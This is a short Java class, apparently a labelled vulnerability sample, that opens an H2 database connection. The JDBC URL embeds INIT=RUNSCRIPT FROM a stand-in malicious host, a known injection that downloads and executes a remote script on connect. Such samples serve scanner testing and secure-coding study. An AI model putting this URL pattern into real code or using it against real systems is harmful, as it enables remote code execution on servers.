import java.sql.Connection;
import java.sql.DriverManager;

public class H2ConsoleVuln1 {
    public void connect() throws Exception {
        String url = "jdbc:h2:mem:test;MODE=MySQL;INIT=RUNSCRIPT FROM 'http://malicious.com/jndi.sql'";
        Connection conn = DriverManager.getConnection(url, "sa", "");
        conn.close();
    }
}
